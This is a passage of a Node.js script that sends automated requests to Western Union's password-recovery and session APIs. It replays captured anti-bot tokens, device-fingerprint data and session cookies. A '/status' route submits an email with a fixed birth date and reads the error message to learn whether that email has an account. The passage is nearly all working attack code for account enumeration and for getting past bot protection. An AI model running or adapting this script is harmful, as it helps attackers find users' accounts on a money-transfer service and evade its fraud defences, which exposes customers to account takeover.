r0_rHsYFcJdFGFWvi1-esIjF-wGrtBeG5RFbHr-8Z0Skryhye3HVvWwe50K8so-Rr9pnsU5b_2DFsCDJwJ-mjWrEGW5DBV4qQR_nsihygFKeMpp3gSjb_5KXr0Bfs-OeGkx3tWwqulGFllGmllp8HI7=Mp0Nx=ReTWwyl7-fgI6btW-kfVyXgipFx9LFu6SXc8G=lY_Rvl_38eyyU3Zl59wcFetSDD_IlItnHIx8H1Ir_V4PuWtXgipX4BF80YDRN6rTg-O8tk4=gsKrEyO-MVpeQIpwdkGVjWj8SPeFPIjNsIwf3YwRco4WlIHrtx7cqYpyuqZee1zbHrG0UQQoH92FTPBRjWufV5y37KWRI0d8vwWXHk-QHfo3IMkelMtkNIpndbKFGCDe4KOrwpKFwBDksxwn5X7ml7q=c0sOjW2RsRBbDp3XTG5ecp-FP3w8=k-rZfDuGwZMi9r=I1QFClWXTWHvP0GX0-4Xl=-Ug3LR7p-ewB_mdldyGeWmCBQrHI0einlmIXrFQb_=lpyNMVY9Cpfvvl-IuWten=6XTeDyiCHn-1SFMpB6rW8fsDKLgI2OnetDe8_8H3z8EWM=59jmZIDeGWGnleUWlW4FLR_3WptfARYX0I480lFF50KTibH=H9w8D6QbDusbADKvZ9jNeWSrtW6=g=SrEMFfg4_QU=pFuifMCKHtfOiqfW2=PYG3ZVSkQPKDGF',
                    'x-nyupe9cs-b': '-jmwluk',
                    'x-nyupe9cs-c': 'AEBX1FtkAQAANVKsr9XWqwhAGGbiv939SwbIO0iwSp5fwGkPqt07bEXF7876',
                    'x-nyupe9cs-d': '0',
                    'x-nyupe9cs-uniquestatekey': 'ABxT61tkAQAAeh8HaJuM8DwqSGCHiTnQ3nZHbI6wfw3vtBg2ZPfQrYL8bykH',
                    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36',
                    referer: 'https://www.westernunion.com/ES/EN/password-recovery.html',
                    origin: 'https://www.westernunion.com',
                    // cookie: 'AKCountry=TW; AKZip=; AKRegioncode=; AKCity=TAIPEI; AKAreacode=; AKCounty=; WUCountryCookie_=ES; AK_TLS_Version=tls1.2; resolution_height=800; resolution_width=1280; is_tablet=false; is_mobile=false; BIGipServerwudispatcher.westernunion.com=570502410.36895.0000; SERVER_COOKIE=R4; AMCVS_AACD3BC75245B4940A490D4D%40AdobeOrg=1; _abck=j7z8ri4f0kgkerkhpqge_1932; cachestatus=enabled; s_cc=true; user_txn_state=0:1530512033550; kampyle_userid=36ef-d12a-aad5-37a9-6ce6-0dba-fcd1-9b5b; cd_user_id=16459a0520032e-08275ab80f343b-47e1039-1fa400-16459a05201102f; QuantumMetricUserID=21eb5d6693cb92e3d58c7d611cfffd8d; QuantumMetricSessionID=f930c8f10eb29292ec9bdf652e3146a5; PathContent=/content/wucom/base/es/en; s_sq=%5B%5BB%5D%5D; s_error=C5000%2CC1172; s_t=1530531942099; WULanguageCookie_=EN; CookieOptIn=CKTXNL+CKPERF+CKMKTG; AMCV_AACD3BC75245B4940A490D4D%40AdobeOrg=1099438348%7CMCIDTS%7C17715%7CMCMID%7C00302567015786158761033064356710531361%7CMCAAMLH-1531116829%7C11%7CMCAAMB-1531140891%7CRKhpRz8krg2tLO6pguXWp5olkAcUniQYPHaMWWgdJ3xzPWQmdj0y%7CMCOPTOUT-1530543291s%7CNONE%7CMCAID%7CNONE%7CMCSYNCSOP%7C411-17722%7CvVersion%7C2.1.0; channel_stack=password-recovery|login|password-recovery|login|password-recovery|login|password-recovery|login|password-recovery; JSESSIONID=7vzkdxn6gbej17vdv8nxktgsa; s_dfa=westernunionnewglobal; mbox=PC#e840942bc7134461bc6549949f9343a8.28_13#1593783919|session#72249bcb5e314b3d882dedd5f07ad242#1530540982; kampyleUserSession=1530539122828; kampyleUserSessionsCount=18; kampyleSessionPageCounter=1; kampyleUserPercentile=87.48893931071615; SessionId=web-c17c58b0-4d2f-4642-b721-b7cec2eedbf8; SessionDomain=www.westernunion.com; s_NewRepeateVar=1530540723114-Repeat; s_NewRepeatprop=1530540723115-Repeat; SessionInfo=1530540724502',
                    // 'content-length': '224',
                    'accept-language': 'en-US,en;q=0.9',
                    'accept-encoding': 'gzip, deflate, br',
                    accept: 'application/json',
                    'Content-Type': 'application/json'
                },
                body:
                {
                    bashPath: '/ES/EN/',
                    external_reference_no: '1',
                    gateway_customer: { email: email, date_of_birth: '1990-03-04' },
                    security:
                    {
                        session: { id: session },
                        client_ip: client_ip
                    }
                },
                json: true,
                jar: j
            };

            request(options, function (error, response, body) {
                console.log("getting register status...")
                if (error) throw new Error(error);

                console.log(body);
                var return_html = '<form action="/"><input type="submit" value="Return"></form>'
                if (body.error.message.includes("birth") || body.error.message.includes("date")) {
                    return true;
                    // res.send("" + req.query.email + "  was registered");
                }
                else {
                    return false;
                }


            });

            console.log("cookies", cookies);
            console.log(body);
        });
    });

}
app.get('/status', (req, res) => {
    var email = req.email;
    var options = {
        method: 'POST',
        url: 'https://www.westernunion.com/wuconnect/rest/api/v1.0/CreateSession',
        qs: { timestamp: '1530536393692' },
        headers:
        {
            'Postman-Token': '288175f0-963d-4545-94c0-91be14d979be',
            'Cache-Control': 'no-cache',
            'x-nyupe9cs-uniquestatekey': 'ADqRE1tkAQAAkjmhWODutsaezU1BfIcB2UqXQx03-PSB14WvsZBUqJpDLMg_',
            'x-nyupe9cs-d': '0',
            'x-nyupe9cs-c': 'AECd-FpkAQAAQ6vInBHPc4u7ecVIzy5NpKDH09IAPjiaqvmpxyvF2vAbt_L8',
            'x-nyupe9cs-b': '-d9qubq',
            'x-nyupe9cs-a': '4HCximCWxmCxp_oWJhKQBMUnEWWLnL0xRb1LIDvlIQZi9koQ9sTFBIu1-lLL-HFa8Vua7oCW7nJTSD2Z7nJN=toqnAKvuNuQrWFqp_5B7JWLEL7YIBmqrz=4-egN76d9jkSQ=_1zIVrQKA42nWFN0dxLn4oZKkeLEMSMSD2wyvUSEvS6BHeF7DjkIVtAEYK57zC66W-LnqZDnbeLIoJ3J_65=bnt6TKh7zytB4d5I6KZjTJ2rVdL-bKjdl02I6TDXoCZ-EzNEk6UE_SQ=my0rkSQu5DSrDZOn4KQJ8rlnyLd7d2MElZZEAHlEqKvtHurn5rfIoCmBs2OjoCHJkeFjkdLEkWw6zrui8wm6z1OIs2-nbrA6zCmKknd7n7hvjJMSNuMjkW07_eSjbhWE6KNtvSwj_FWKHC01kWQSgD=rkdUzVjW-6K_0v2jF4f9f_y-ivJz6WHXs6uM7brb7aZ2dkRvibdk8_2Zf5uanhdQ7brS-jTLjWLL6kyD6khQyD71UWjLBWJz6k10zboW1NRU-TYeJhgUf_ouIvDx-b5J7_Sm0VKZKHgZiZSvp_SbEHytvNpkxv2OnZwmBzoqvLhqJ1Yo76uQK6rwIHZxfbrZjko-x4DUEM0LnkoNeAKZI_6ZEFzQRHFa7HCQ7IDUJVuCjU2jizdA5HKbSqruBHofikVZjHVprHoWkenLkkH9JjitfAK8EbKQd-2Mo_XlJ8xt1kCwnNhUnA2Z7enFXv246AuMp_CmrbFvBbdWJ_JZEbFmkl2m6kCW7eyL9kRUX_CYI_7wnCrAEHoNB60woWYWJ_YmMeuz7_F0p_osEAKOnNqU76ZmBfhsEbzZ6Xry6y71oMDvX1ra7amO0tpAEv2ZI1U0I6ujnbdxXVLMBkKgBmoanzg2fcrWh0iS_gZahnuWfsCvfep5MbeA767jjAoynvmbpjOLvV2WJbNLJ_rxj6p-nzrlXfd2jkrZInu8jAoapDKMukoHEbj-oA0MfVd-E6mw7HyxK62TpvJZ7onx7Hy06khNU_9SnAuzBfuOEH10th9vESmWI5DvgvZi7fB-EXr0UV00KkB98dxpd0uOp_7Q7HoQp_1-phdxEqnMn97-=o9ZpVrqtD1L9ArYUv2fnjpLiqrV6XJOBq0OJ_ULEeFmsk7aHV2yBs4vEDwWJ6KM=1Cz6kJ0jViUP_hq76jkjkHlInwmBs0-76o5fHhOpVrWnVjQxHg-34pPjl2HBfKQxjBLnMv7BHhOjK75jAmYnkbln42TnLBA1Li0jerlyvCwk6uWEeg5jbTLBl2wpVEiiYEZJHSjp_w5nzYO7oJmFkjFnzL5KHFNI02mp_mMfAuMdbe0Jqj0B5oVy_gBMV0wJs0wEbHa7mCmE4dtJbKW0_nLE5uwK5clBzujJ6KzX_yxEMSr8TyXnbULEbm1o5e2re1MMl2Wp_oSvcpLn_yLBH6iszu5y_mmJHSrEAJ-jNYW1_F6jH7M0_oeibFg7W1vEHzjJvDXLZZNM6KvvHultVpLJ_ohEk-5iWrV7HeWB6rMr_CTpVqfjere8Hom7bohBfvljkrm1VKQxVp-imrOMToxBAoQEM2a0V8lrfSWntiqEkFa7HLLpVuWxWoVE6fUnbmlovmZtHuU9kCmI_6Z7_CmfDeLfmCa-be07duWdHhbW_4vx_F-xVu5p0qV7lvL-6fUKH1-nm=lJ_mxo5LSh6uMfVuz7s0OpjwYmVoz6AuaphClEdCzIf2m7d2WJhJaKvRqJ-2h71FZxby0pvzMnl2Y1ApLJ6j-ibCxn5rNptslH-0O7fhafVKsn_y0j-2-nWWFnOPw75T-7VuW7nuQ7HdL1bS6fe6LdaLF0nohEM2Y-4ZNrmLww1fZ6kTLjVKN65BwpDEDJv0Fep2m0V7MrfKQKoohddFZB3pLpVu1K12wIzJQp_KVy_EZ7bRqWHKajVKVJ_iLfv2Q6XKM7Hu5imXlp_hj63uQBs2Y7f1zE_SOEqgv6zn0rLuzKAo4oC7wjsT5FL2DS4uxBF3I_hrZdko1X87cB1_NP42QphChfgghggZi657-7HCmjkoOW46ZK30LJ_mqdb6V65uMKHoh6zKqEo95Eoomk6oY5_Y66yzwdbo2KnpLBf4501oa-smMEVuQEM21nDhwJVKw-AraBfeMXs2mpDhqoVuUEAKDohuznl2NBsq5pV7Sp_108VurrqrWog2huymV7qhZ6kCaEmrWo1ZhpVKNJeFmEWnWp8uT=D2aFItl=hrgv4rsnmu6ohoMnk5V6kmVjjZQEqKW0eJTU6K8ykmqE_CmdAL0jAuBpjmBJVKZn_I77VKMibdL7Hq5jerln4umJrugKkhj=_U0XVZ4_M2mJD2MB5gTI_oMIgi5BmnLBb_lf_hz7_CgpeYZIHmln42OnbSNJ1avJe2l7HFwJtuvII2T=_1On_oMyAHl=6ZZnllqIk7lzD8Nbs00KKLLyVof6yuOJDKuj6vf9k6-6k_LEkTk1kNLBs2Tx42TKWoa7mKjjL2Qf_zhjtpL76Zqfv2qnqrsdoCmrAKO2hrz_aT0n5gvJkmQiDuYnkrQp_-xJeShrqeLXe6KJVZm7Qg5B5pd7JklWWZqE52UfAo1JVuZ0gZoEmCWo_rzjHULBH45z-hftoCaJfTLdAKOnlvlEwTLh5iHBA7Sxm91KHpAB1oT3_BSBf7O=Dj1VkKjjl00sAp8nquN0_68BIpzB6uNnvSWjboPnVrZEDLwrb1UE_rYxmnLr9rMHeFZKWuf71nei4KmtoCZin2WJ_SVJ02jZbCSnmJO7Ad2BoJWFDhmJ_uZjbTS7HS-E-vLJvS5od',
            'user-agent': 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36',
            referer: 'https://www.westernunion.com/ES/EN/password-recovery.html',
            origin: 'https://www.westernunion.com',
            cookie: 'PathContent=/content/wucom/base/es/en; BIGipServerwudispatcher.westernunion.com=855715082.36895.0000; resolution_height=800; resolution_width=1280; is_tablet=false; is_mobile=false; AKCountry=GB; AKZip=; AKRegioncode=EN; AKCity=LONDON; AKAreacode=; AKCounty=; WUCountryCookie_=ES; WULanguageCookie_=EN; AK_TLS_Version=tls1.2; SERVER_COOKIE=R4; mbox=session#511d349636594215a6313e9b4008f8eb#1530538239; AMCVS_AACD3BC75245B4940A490D4D%40AdobeOrg=1; AMCV_AACD3BC75245B4940A490D4D%40AdobeOrg=1099438348%7CMCIDTS%7C17715%7CMCMID%7C05521918946796555033626033985544718340%7CMCAAMLH-1531141185%7C6%7CMCAAMB-1531141185%7CRKhpRz8krg2tLO6pguXWp5olkAcUniQYPHaMWWgdJ3xzPWQmdj0y%7CMCOPTOUT-1530543585s%7CNONE%7CvVersion%7C2.1.0; _abck=f485yh8ugka3wbree44h_1760',
            'content-length': '1438',
            'accept-language': 'en-US,en;q=0.9',
            'accept-encoding': 'gzip, deflate, br',
            accept: 'application/json',
            'Content-Type': 'application/json'
        },
        body:
        {
            bashPath: '/ES/EN/',
            channel: { name: 'Western Union', type: 'WEB', version: '9Z00' },
            device: { id: '', type: 'WEB' },
            external_reference_no: '1',
            locale: { country_code: 'ES', language_code: 'en' },
            security:
            {
                black_box_data:
                {
                    data: '0400JapG4txqVP4Nf94lis1ztnqv7CRnBjGOXyx2B+S3GHv4zk88XIRRreSheVy5uVhms1zdzcTh8G1jzSkZrXqxWzKE0A/nZNqkwx/N92fWAavNc/p/1y9PHkhCTHg+Ms0Qhlz5wlRFwWJi0FRulruXQQGCQaJkXU7G/xCx87H3fYKpqOurJ+l94mG/cdkIMFbm6Yf0/pTJUUx4zcJIblb5JwydKgnOIDKXq4HnEqNOos2/G9pg/BLzT0xFXRiZcQcAnPGnG3CqgLln+4KLswTyWhDAstLN4US5V97h50/5jKuksZ+gFcc8aSdlq6Ngoi5gQITTv1Udki2WMCVbBcdxP6GA3q0kDinWcD6T1dGUjL/hT4nUgBHv4srRWAJJyLNLGj8lONaIGWAEO5SUXZsfzDNnJ9MtC3SwZ/Ah9jXzHp3ED3HepEpuM5tlG61Ntm9z3eln9a65pRCSbhnEUAORTqNiYutQpOa3V62N6Jqrox+LqCpize7FnCuSoEQI23c8MGfGDfMJjL1T/pZNnUTdpA1nyvZTTnwuL6uF5RaYfJDHvJpxYj49Ituh4sP0IV/AjqwHORviq2ncsJVGc8WrWaLE8yqMVQun0jxRYAmjKb1P4ehBV15lxB8HyigIvqgOtuhMAAc2rn1HDo0vYYDC32yzkoyzQ+ygbazR87feXj71svFCT6Ov7S0VWBiBsphp15tFwbb5NkVtrNHzt95ePpTGzJJvTFl9FmQWppRl6Bv4pp48B2PR0LUM6Rn3JtHEfF9hXdZ4DRRiwxmZVjl9I9/GSHlRbmqB3FC5PmOztORMyPpjzYuuV+VhT2JQxvTdC24eZzo97tw16kQoiglK7BJDLfM/X8TvaSyxlUFCiGEdsE8OdwolivehTqT3rw1rUL/Q9DBUr0B8X2Fd1ngNFGSttdZygKPcjXOee1yaDxciKug0+fq4xP2vFnup4QVZmvVWVqAwSicuR/GvVGCWVsTCBZ4TPdh6fSO+PRDZJ3t6I7HSG5+fdiq9o8M92MmVzpOtSOhYmUcg4U0csxkunCw+Jld00Kp8x9RU1HbupPmv0U+PWz4GSIrr+l3H+CrCQOoYdjeTIN4Q7WiTJdXVW619Jo9sezyB2DaomfLTglnhwCemZJhfAhzQxNaIYqv5',
                    length: 1156
                },
                client_ip: '245024209201'
            }
        },
        json: true
    };

    request(options, function (error, response, body) {
        console.log("creating session...")
        if (error) throw new Error(error);
        console.log(body);
        session = body.security.session.id;
        client_ip = body.security.clientIp;


        options = {
            method: 'POST',
            url: 'https://www.westernunion.com/wuconnect/rest/api/v1.0/SessionKeepAlive',
            qs: { timestamp: '1530552379733' },
            headers:
            {
                'Postman-Token': '6c6c82e2-f8b0-4835-89bc-8b47ef90aa0f',
                pragma: 'no-cache',
                'Cache-Control': 'no-cache',
                'x-nyupe9cs-uniquestatekey': 'AFhq2ltkAQAAoaBqprVRLxeZP3fKVbefL6QDKK-eTWSLLPzst-pLYODN5w0Z',
                'x-nyupe9cs-d': '0',
                'x-nyupe9cs-c': 'AEBX1FtkAQAANVKsr9XWqwhAGGbiv939SwbIO0iwSp5fwGkPqt07bEXF7876',
                'x-nyupe9cs-b': '-d1ahnu',
                'x-nyupe9cs-a': 'n6rbmBdKXjYCXHcNYZzi_oLpu3-FtC_D4hVhmA_DSs9nU3L=fopmsRY4sKG5rGHNX_rGQwVwkRVsFTQGX-rZuTtwvGJmHcxmdwpDqTdRHBd1CkqKw3WrUwYddgpaFZaW4Ar0tO=1CsGLS2Jl7lLDuLO57CSId0FWuApErBMUUWz_FauWsCdVtodgVi7g5JVMYTOvFTdC=PdIqZdTX--=6jLi=Pq6u2ohxZziJC_hJ_vkgTp54LYUSWYlevSEU6CDS3TWtCKpCIzgvPdm=2VDMXd5M-QKqAaWs3dLuACU4w2c4fzv43S1c-3Dq5Yix-p1SCQLnDLM4AaBFPzpUBGZnCtRc-=WnCJ5b_YpUTpl4TxGaB3UXazp4BMD0p_zvHdZuAdMtquTUsVUPkFWTG8GnRVprizNP-WiuTt04GF1r_OKxAnwqG=qxZz0J-8M7aIDt=1DuA-hdjYpxT-PqOv-Xa8LsfFggWYVMar=Q=O5MlqW7HzKbTGLcZJCUDto5wVUV3nL7AQNqA2st-QLuDGpSA7YVaoIuwrm5CK6UQqWFTdp4ZwG4=Lh7DYIFFvPkZdEU=U5xwYhQcWrYGjhkZJotpzB5-aKx-0qUBGmxHqWgh0NRSYziWb5LwQCFPCWtG8K43zq3A6DtCdmt-MK7aiWEDFvqsnhQaC7GJQ4U6d6d-r1xLbhxToUsG85kZJqqsrhS3vj7uFrxrvv7DY1s3JV74dnu5VUFZ3wrANM72dG_ZJDtAOWX2x5rB0muZV_u6NW7-ZpCOGL4url_XzmTxKEFwWa4TLlwNL0z-FYQkJ04sMDdPF0FZFOnKzMFhUslVQKJPoMu=Gl-ZEhYTS7V_xEUjYl7-GEvj=ex-CpFZzpk2Xh45xU4-qPnEWDM7tErHO3_TQl4Arlt_oUbVQiFwYlqT9Iu3JmuAoa0pJCCjLsabYMXTrikqaruAarUAQ0uBrDS2p0qAdNSGvWq2H9MCnfu6dEe-dMufFsWOdDYV8pnm5ht-WvYwYs7_F0OWFsU5vvr2NrWwYskZqmcV4AS6dLumxNqO5v4AQmgWFrFVGkxCJiU5YluDAhC08sxZROJmaPS3dh=jqKS=Li1Xzl_q2DYYrLvZvrHB61UTGiJB=JniPh4HPqC5mkrAro9wLgHw9Yu0xmIELZ7_vmQqGstBpc4A80upQwxZQmgpSWtzppJr_p7CRvQIYC7l3v4Aqh_AdYxSTMtZpGqqzNxG=BR_lzPA8lS0=1kG=vxTPGUA8pnar6wDSixTa0XwYpq2z5FTOrqv_D4aR8qmG7ujx0fi7WGRMQnXpLJVGp1Zd14ZaStTnWFw9fdTNvQ0jctTGq7Nzl7BQRapjDnQdpnSDh4DdIq6r1u2Ss-T0pq3qU4Zzlc-aigZW5C8dlv3L0voWgJaxbOTrsgBdltBQv_A75SWMwUNzpvYvKX_YAU6Y1SCJ6aB8U_OVUBELpth0G4BCLxHZWJSMmt-ppxoLVsidDUhLE_z=iBTIWYOYQuBGESB8wHmaXqvJvuiFWxZgWuioCu5d1U2JmdizqxPQl4JGIHZzAXCQluinSdaQI=BLhkV3wtwwtxGNWvw0mFZQKa5lDvkJKrACY5F6WuoWWko3YqZrE=sz5QRpBqVqswpYGM-ziSHzatQVpnNts_zJL7AQ_FwvBq=sWtR2sDGJKniOB4BDsXTZhQ2VptCScspWW=DS1SBdhHCz0CsJacPQiJlWWPp=ZnRYmWTGEug3s4SYinQ=B4BpwtlLidBFWuApEC5YwFVxiq5VMV6dUFZSrUA=W4uKstGxiMC4pJ-=PaIGwPT3Y7lWsu5YFnHqWq2QUxTagq-QpomuMQ5YZlOriuWvMC2zhQZQpqAmwFTQnujDhQdSUFGWFJkaiJ-MI7uYvZW1VU6xqdvsiUEh1t-SrkZdDS2-h4AGnXsSjUAQ54mxUUmdlYOr0xlDhvOQpU5pEJGd47Cq7uPvWVA8hUmd9xZJDC2YCFzIDA-SWsGJ5qQd1a8pln3_UBACUt_doqBDUtaRXFoWU7Q-h9QusU2JluDGLaVqOkOCIJ2J=7BUKFTpUMau5q5LmqSOsU5vV7HdV=OBpCIs1U=nW42FW0DSgvZzm43FWgZzMJsgs4AjDU-MPV2J1U3FWdczD7-8N_5M_t-8lvOd5UB80UmohQZnSq0dhnjLpQwYmUSJ5p8_gS2C34j7OwVdLUBTXR=MmXZdGvZ3LC0Lwxv9h8oDwXVplCV7BU5vsUsvvus9UQT65xXYZ_oDhHAaWYVQhCCzpN0z5xTmWFcF2gArlX8M1FZCUPTG5tu79z0xpXRxpxGaruAM1FINJ4pd58ms5dZY64sYZSarRdizZxuKpGrGVq-s2MtpmTwvWXCJDuBqv4Bm54B8DtOqvuWGvOcF9tOl6tDOWt0YgAIdan-xlaB85FwhGxT01UjDNCBQ5kYgk5DY6SB0GsmYLM-pLuZYZn_VDqTDUtTQLFOQ3BTCptHck45VpxcvWxO6WCIEf4PJUkVYDxV6w7AJvvPowuTtmSGQ14Ixw71JIJTOEB-8LLTJl42QVt_SIU2zmSGdmFGznCB1lqPqWYTCD7idNXT=OqPzBX=1LusSj6Aj-P_dlUpMUnTt64koLx-uDC0a44mxmtAMiuEAhX_GGMHdpUDohxwYQgDHht-qW7-QitXmORqpA7Q8FuEhe7Rv9t-roXPQsJ-ox43uHtaofqLmmuBDjtQ=IsAmWx60lUBQ5U6rqxOVhJBCh=IdvhsgJq2JOtkQptEjU4mJEqTQNFTQ1qBQpFOVU4B8mHsJpuG8m=vMarmqutSYRX-Q5FT8EHXzl4sYEuZdCtHzA7HzbHaQNuZdDqTr6dhmiMR0p_T-4cT-hUiCwkOMmU2dCn5LlxZtR4TWs7-QlusYDHoq14PqruNWBn-tmcTt87aO3FTkXFT0EFOIUghvstpnwxoLit2JmaCL342zi7D4wUrZBd_-J2aQ1Yv1LSI3BHZdL42aTQBCGq08EqTrAqTGmakQ8gBQL43QpuAMEC=xV4_z=4h0_A2_RnTQmUZJwqH1U=h6vVPOWqBr1CB6WSZ_LtNch75YpC08npC_J_VJaJJLpXoMpO-QlS6aKtRvWC2SsgaxlSBSmUiainmQLaOdfkdMES=3IX_VZJ-t5FZ_hu3sw7BsAqwYiq-G1kVYYnmQm_a=r_A=OQjDwufncYYxmvCFrMuKEFVQmt-MZUmzsaGKDqOdZu086tAsVFZdpc-GAzO8p0FjFtSY1u2xLAXFV_oL9lGuqSBG5tarEnWYpM-=Ov2QpUIx5GsJI-TlvqTs2HTaW7CJsnADDDaqEvOarJ-dqXCFPuTIhxTavH6UJJ-QEt-Jic-ZIXCzNnDqiVidzABQpniQRuPzEaB6Kz3dZgAOPt-RNt-jYdkQm4OPW7SJLJaK582FU46zpCmlIufvn7DOWtR06vZRhrhPhS5YwEjYE=0JEq0xw4AM64izmFwrsMHrTUBM3CBzikPaWF6LNCBQ6XAChQTCLJP4UgOvIPPd0M-tNshvrQBpDC2JlVAja7_z5g6LKtXoDSCp_uTOPwZJ1MHzwkZtidT8AxOG5kToUYqgWxZ4guiqW7SWPFP11qMoM_vS9uwv1tBd9tvUBtQJpsEDFtmzww-MmSQx5XBGmxSVWBlWs73SW7_7IdAs24puWM_YiMJMEu2zoPZz54a0ES3dEQCJmUkQ-Eizq410lQjLNfCYpa2nsNTCL4Or5tT4DCB837BLIRBGP_6Si7-srV6dCUDtsUAto2QJ6xTJmtJ=',
                'user-agen': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36',
                referer: 'https://www.westernunion.com/ES/EN/password-recovery.html',
                origin: 'https://www.westernunion.com',
                cookie: 'PathContent=/content/wucom/base/es/en; BIGipServerwudispatcher.westernunion.com=855715082.36895.0000; resolution_height=800; resolution_width=1280; is_tablet=false; is_mobile=false; AKCountry=PL; AKZip=; AKRegioncode=; AKCity=WARSAW; AKAreacode=; AKCounty=; WUCountryCookie_=ES; WULanguageCookie_=EN; AK_TLS_Version=tls1.2; SERVER_COOKIE=R4; mbox=session#641df218e560455a8beedd67dbac3d00#1530551269; _abck=dkoc4gexrhhbaq5h5cit_1953; s_dfa=westernunionnewglobal; user_txn_state=0:1530549414159; JSESSIONID=if91j1a6vvep1fn98fz7imlio; AMCVS_AACD3BC75245B4940A490D4D%40AdobeOrg=1; AMCV_AACD3BC75245B4940A490D4D%40AdobeOrg=1099438348%7CMCIDTS%7C17715%7CMCMID%7C66763440628435560523005198298108464384%7CMCAID%7CNONE%7CMCOPTOUT-1530556617s%7CNONE%7CvVersion%7C2.1.0; s_NewRepeateVar=1530549417155-New; s_NewRepeatprop=1530549417156-New; channel_stack=password-recovery; s_cc=true; kampyle_userid=1557-b9f5-101c-8d61-9806-f6e0-8488-6b28; kampyleUserSession=1530549420594; kampyleUserSessionsCount=1; kampyleSessionPageCounter=1; kampyleUserPercentile=35.10493657397837; cd_user_id=1645bdac6625cc-0430d9ccd7b319-47e1039-1fa400-1645bdac6639d0; CookieOptIn=CKTXNL+CKPERF+CKMKTG',
                // 'content-length': '95',
                'accept-language': 'en-US,en;q=0.9',
                'accept-encoding': 'gzip, deflate, br',
                accept: 'application/json',
                'Content-Type': 'application/json'
            },
            body:
            {
                security: { session: { id: session } },
                bashPath: '/ES/EN/'
            },
            json: true,
            jar: j
        };

        request(options, function (error, response, body) {
            if (error) throw new Error(error);
            console.log('keeping session...')
            cookies = j.getCookies('https://www.westernunion.com/wuconnect/rest/api/v1.0/SessionKeepAlive');

            var options = {
                method: 'POST',
                url: 'https://www.westernunion.com/wuconnect/rest/api/v1.0/GetUserChallenges',
                qs: { timestamp: '1530540724504' },
                headers:
                {
                    pragma: 'no-cache',
                    'Cache-Control': 'no-cache',
                    'x-nyupe9cs-a': 'n_VtgrY56m=6=TQeX73ZvG5_nsrGeTYyr1gdnB8DDcij9cx7EGlKnHbiP0ODk7pj9QnPmCpxAsrKTQpBvl588cVPvP-6mHIwbMlKmw9FN738O5-0RgrBf_-8G4ptWcreguIG0xCuyPRKmje_XTIWfSR_ejyq9jldWi1tTi14iX5dI_6Fms9WyuqX=H--FilpvlB_Fc_B=jWtvgihmfi-kIVjFdC_=DWxfjeDDsEe=eytrwiFnxb_3G-_8ZldEUpOnjWrDsJvEMldkNSl=r97R-=tOB8KnCKhcj3yFEYk9IkhvgC-=36tbDfD8srFFtGtJUcdbqQGWA-7Fgp7mx1lrHUoIEouGZyjDsZKVZ=73opp9fyTRw=vf4ppXTYyTr5-FvkPbEWyxdlL81kwmZfGfyDPm_l_fuPF8teemlIQNvlKXMV4XBitVelK3IY8FUV7FHBBfHx-msihDMBg8r5KDsye=ePgnP3ho-9ANc-jnjWxk7KkmZWkFDej80YsXsC_XTWMFlSj9QYwFn8K3l94IPpEXQ2HFGWHy3p-eeWSFcwWFl-6mHI6fjQhFui4nB9FnGkBFUKP30ijmwY_9r93DGWGngYBFuUjrtx-IepsWG=4QgQwFMBBv73j3vkFIi4_mDY-nZKxRrr_b_3_Q5IwYtpenZR-D5K8Q5=xFtWZnLlFNflBIM3oec08xEeKFgrKITV-mwp7FUDKet1kRsQoFg-JlQDjXv-2F3eoXNY23PYBVbIxbEW_03WtbgI-fcp2X-1roEGrm_RKFjkpn5rpmHI-=73tvwItG=Rpvco7RsQGewDtEGW7kK94FgipcUlZnumF0EI2fBP_=3PFFgrd=ul4FHcXlBV780p4Xcbl0MV-n2itFHiwetW_Xr6-8vFOk7KeFg_jOsM_=PRpbHZlrEIh=ubKmLVjEPrKqxMeGl=_e0Wpe0VWXfz6ygI3msbDiHr_my=-R0ldnSpGndlFveYRtH-4WgrWFg-6qg-4n5y_0uWuNNotgSBK8zo_XCV8frQomsk7LgblDRo777pwqMpFoD9w8dFoR43_FSp6Ptld=VmsQHk_NAXQbZ0_4HIwcfGzIsU_nu3KrCMk8vpp3PQKvH1yXvJFFlR=lHTcXnPFEP0KxUyDFuWtFGb6Ie9krHC_nxbW8B5F=PrF9x1Y=cQW3Hr-9fWdXEo_TgQh0giiyUB-WDYMEPQoR43K2GW4Rjl_X7KDS36-FjWIQjMWmwddeD34tlyKrFVHmI1DFuP_mDWP9crFFHrU041emUIByMMD=l96F4Vp3uM-9nYD9nlKQtWSvPI68CKkIQbKN9I73uWwQElKEGkRm_dXljVw8cVwW_mKXrqXknYIbE3lDKYkwDWPRI1pVPRqXfPKyYXtnHnKejW6M5qd0jeWNrfGyEIjFM3KXgIj=3rK3uY-3e0-WuyWvMlgbEr_3Zfle2ldeSTdygow=gS2fQV-XP0_FlVGeryG=MBKWPfoFHfeWcptEefhWGJGX03qXTeK8xC6bblDk0-dFwy28s8K0j9weU0-eHkUnjIjXN6757WO8wVw3SytFtkd0DMF0cIxCjYjRsM3GEYMXcSDrDyhyibU4chtt9x8fD8K9UYpO45F37Bs3ZGE3GeeV3bDmC3D1Z0KEPQKLHp-kTVtmhXyF5Rp=71-bZGpmEW4fuG7f43lrEWWjEMGcHcdXTlFf-M90jWrVdZ_9cFhIgV_vU968rVsmdW-FsMpvuW7n5V-FlmKX03_XTQDbCMPFPRKeHIx=g3KbZ0BPSIQQHQeKTPK8LzfF-merE97V7VQT7BeXLBKXU1tLTW-vlXtoEI-JLYPXn=DylMRXu0=fcizvgVWIe9VwcIhXjWj0gQlIgRBbEQltuYZOsMGPg0B8ckMFwM_9H-4rHds=GerX4p-DinjNfqeVjQRfyIe=P-derflyg9_gHroEqV7=Gl-kjlFEWl_=KitFgIieEWjnPXw5Ky_DSQfXcYpQ-Y_RsIcefViF4pw=Up2nCp4egIF8rMGbEGYyiC8NckdWlJPTcItFIud8b5KXPRBoEW-3SIfmNPFrw2De5WjFGJKH50K9PVp15QW=UxwO3KepeWwnBYGRDRFTvk_qMpxfcrKmTiDrtxwXGKVee1Sm3lkD2AdO5p3nsIjbZWhREeWFiM_0ZfUL03GuMV3EZRGmwY7q5Wt=lOjDgFT33MBtScKvPV_mSi-XjiI0P9WYwp5b_l_FKipygwMvbeK=etdJZpjQb3oIT3hIeM_oPv__SpGfs